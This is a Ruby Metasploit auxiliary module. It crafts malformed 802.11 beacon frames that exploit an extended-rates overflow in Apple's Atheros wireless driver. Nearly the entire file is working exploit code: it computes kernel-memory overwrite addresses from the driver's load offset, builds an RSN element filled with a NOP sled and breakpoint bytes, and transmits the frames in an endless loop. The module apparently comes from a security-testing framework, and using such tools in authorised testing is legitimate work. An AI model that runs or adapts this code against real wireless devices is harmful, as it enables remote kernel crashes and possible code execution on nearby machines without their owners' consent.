##
# $Id: fuzz_beacon.rb 4419 2007-02-18 00:10:39Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'

module Msf

class Auxiliary::Dos::Wireless::XrateAttack < Msf::Auxiliary

	include Exploit::Lorcon


	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'Build a proper Beacon packet for the Atheros driver',
			'Description'    => %q{
				This module takes advanatage of an Xrate overflow in the Apple Intel Atheros driver. 
			},
			
			'Author'         => [ 
							'David Maynor <dave@erratasec.com>',
							'The orginal man in blue, Mr. Johnny Cache <johnycsh@gmail.com>' 
						],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 4419 $'
		))
		register_options(
			[
				OptInt.new('KEXT_OFF', [ true, "The loading address of AirportAtheros5424",0x8e7000])
			], self.class)					
	end

	def run
		
		srand(0)
		
		@@uni = 0
		
		frames = []
	
		open_wifi
		
		print_status("Sending corrupt frames...")
		
		while (true)

			frame = create_frame()

			1.upto(3) do
			
				wifi.write(frame)
			end

		end
	end


	def create_frame
		mtu      = 1500 # 2312 # 1514
		ssid     = Rex::Text.rand_text_alphanumeric(rand(32))
		bssid    = "\x61\x61\x61" + Rex::Text.rand_text(3)
		seq      = [rand(255)].pack('n')
		xrate	 = make_xrate()
		rsn 	 = make_rsn()
		
		frame =
			"\x80" +		      # type/subtype	
			"\x00" +                      # flags
			"\x00\x00" +                  # duration  
			"\xff\xff\xff\xff\xff\xff" +  # dst
			bssid +                       # src
			bssid +                       # bssid
			seq   +                       # seq  
			Rex::Text.rand_text(8) +      # timestamp value
			"\xff\xff" +                  # beacon interval
			#"\xfb\xf8" +                  # capability flags
			Rex::Text.rand_text(2) + 
			
			# ssid tag
			"\x00" + ssid.length.chr + ssid +

			# supported rates
			"\x01" + "\x08" + "\x82\x84\x8b\x96\x0c\x18\x30\x48" +

			# current channel
			"\x03" + "\x01" + channel.chr +

			#xrates
			xrate +

			#rsn
			rsn

		return frame

	end

	def make_xrate
		#calculate the offset that RSN needs to overwrite
		staRsnOff	= 0x4aee0
		kextAddr	= datastore['KEXT_OFF'].to_i
		staStruct	= kextAddr + staRsnOff

		#build the xrate_frame
		xrate_build = Rex::Text.pattern_create(240)
		xrate_build[67, 2]="\x00\x00"
		xrate_build[71, 4]="\x00\x00\x00\x00"
		xrate_build[79, 4]="\x00\x00\x00\x00"

		#Overwrite address for RSN element
		xrate_build[55, 4]=[staStruct].pack('V')
		xrate_frame =
			"\x32" +
			xrate_build.length.chr +
			xrate_build
		return xrate_frame
	end

	def make_rsn

		#calculate the address to overwrite the sta_default struct with
		rsnTargetOff 	= 0x4af20
		kextAddr	= datastore['KEXT_OFF'].to_i
		rsnOvrAddr	= kextAddr + rsnTargetOff

		#need two bytes for alingment
		rsn_pad = "\x00\x00"

		#copy the address of the payload over ever element in sta_default
		rsnAddrTmp=[rsnOvrAddr].pack('V')
		rsn_overwrite_addr = (rsnAddrTmp * 15)
		rsn_code_size = 162
		rsn_code = ("\x90" * rsn_code_size)
		rsn_code[10, 4]="\xcc\xcc\xcc\xcc"
		
		rsn_build = rsn_pad + rsn_overwrite_addr + rsn_code
		rsn_frame =
			"\x30" +
			rsn_build.length.chr +
			rsn_build
		return rsn_frame
	end


end
end	
